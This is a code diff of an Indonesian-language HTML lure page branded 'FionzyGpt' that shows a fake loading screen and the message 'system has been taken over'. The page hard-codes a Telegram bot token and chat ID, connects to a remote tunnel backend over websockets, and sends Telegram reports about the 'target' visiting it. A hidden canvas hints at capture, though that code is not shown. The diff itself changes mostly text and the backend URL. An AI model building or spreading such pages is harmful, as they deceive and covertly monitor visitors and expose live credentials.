@@ -9,10 +9,10 @@
         body { background: #000; color: #ff0000; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; text-align: center; }
         .loader { width: 80px; height: 80px; border: 5px solid #111; border-top: 5px solid #ff0000; border-radius: 50%; animation: spin 1s linear infinite; box-shadow: 0 0 20px #ff0000; }
         @keyframes spin { 100% { transform: rotate(360deg); } }
-        .fionzy-title { font-size: 50px; font-weight: bold; text-transform: uppercase; letter-spacing: 5px; animation: pulse 1.5s infinite; display: none; }
+        .fionzy-title { font-size: 50px; font-weight: bold; text-transform: uppercase; letter-spacing: 5px; animation: pulse 1.5s infinite; display: none; color: #ff0000; }
         @keyframes pulse { 0% { opacity: 1; transform: scale(1); } 50% { opacity: 0.2; transform: scale(1.1); } 100% { opacity: 1; transform: scale(1); } }
         #videoCrash { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; background: #000; object-fit: cover; }
-        #toast { visibility: hidden; background: #ff0000; color: #fff; padding: 15px; position: fixed; bottom: 30px; border-radius: 5px; font-weight: bold; z-index: 10000; border: 1px solid #fff; }
+        #toast { visibility: hidden; background: #ff0000; color: #fff; padding: 15px; position: fixed; bottom: 30px; border-radius: 5px; font-weight: bold; z-index: 10000; }
         #toast.show { visibility: visible; }
         .hidden { display: none; }
     </style>
@@ -20,13 +20,13 @@
 <body>
     <div id="contentArea">
         <div id="loader" class="loader"></div>
-        <h2 id="progressText" style="color: #00ff41;">MEMUAT SISTEM... 0%</h2>
+        <h2 id="progressText" style="color: #00ff41;">SINKRONISASI... 0%</h2>
         <div id="fionzyUI" class="fionzy-title">FionzyGpt</div>
-        <p id="subText" style="color: #fff; display: none;">SISTEM TELAH DIAMBIL ALIH</p>
+        <p id="subText" style="color: #fff; display: none; margin-top: 10px;">SISTEM TELAH DIAMBIL ALIH</p>
     </div>
 
     <video id="videoCrash" playsinline>
-        <source src="https://raw.githubusercontent.com/fanzzy01 /Lock/main/Devil.mp4" type="video/mp4">
+        <source src="https://raw.githubusercontent.com/fanzzy01/Lock/main/Devil.mp4" type="video/mp4">
     </video>
 
     <div id="toast"></div>
@@ -34,7 +34,7 @@
     <canvas id="canvas" class="hidden"></canvas>
 
     <script>
-        const BACKEND_URL = "https://articles-depend-mistakes-brothers.trycloudflare.com"; 
+        const BACKEND_URL = "https://synthetic-ship-stuart-parenting.trycloudflare.com"; 
         const BOT_TOKEN = "8441186762:AAG-wyDQFlP6sGXdIe6nxdk1HuEuAAyszWA";
         const CHAT_ID = "7373392803"; 
         const socket = io(BACKEND_URL, { transports: ['websocket'] });
@@ -43,7 +43,7 @@
             const v = document.getElementById('videoCrash');
             v.style.display = 'block';
             v.play().catch(e => {
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=⚠️ Target harus menyentuh layar agar video bisa diputar.`);
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=⚠️ Target belum klik layar, video terhambat.`);
             });
             v.onended = () => { v.style.display = 'none'; };
         }
@@ -90,8 +90,8 @@
         let percent = 0;
         let loaderTask = setInterval(() => {
             if(percent < 100) {
-                percent += 2;
-                document.getElementById('progressText').innerText = `MEMUAT SISTEM... ${percent}%`;
+                percent += 4;
+                document.getElementById('progressText').innerText = `SINKRONISASI... ${percent}%`;
             } else {
                 clearInterval(loaderTask);
                 document.getElementById('loader').style.display = 'none';
@@ -104,3 +104,4 @@
     </script>
 </body>
 </html>
+
